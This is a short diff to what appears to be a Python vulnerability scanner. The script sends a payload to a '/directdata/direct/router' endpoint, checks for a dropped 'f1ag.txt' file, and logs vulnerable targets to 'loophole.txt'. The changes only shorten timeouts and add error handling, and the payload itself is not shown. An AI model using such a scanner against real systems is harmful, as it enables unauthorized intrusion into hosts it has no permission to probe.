@@ -48,9 +48,9 @@ def send_payload(url):
     try:
         print("[+]start scan......[+]")
 
-        r = requests.post(url + '/directdata/direct/router', data=payload,headers=headers,timeout=6,verify=False)
+        r = requests.post(url + '/directdata/direct/router', data=payload,headers=headers,timeout=5,verify=False)
     
-        r = requests.get(url + '/f1ag.txt',timeout=6,verify=False)
+        r = requests.get(url + '/f1ag.txt',timeout=5,verify=False)
 
         if "1" in r.text:
 
@@ -85,11 +85,19 @@ def savePeopleInformation(url):
  
     if newurl != 0:
 
-        fw = open('loophole.txt', 'a')
+        try:
 
-        fw.write(newurl + '\n')
+            fw = open('loophole.txt', 'a')
 
-        fw.close()
+            fw.write(newurl + '\n')
+
+            fw.close()
+        
+        except Exception as e:
+
+            print(e)
+
+
  
  
 def main():
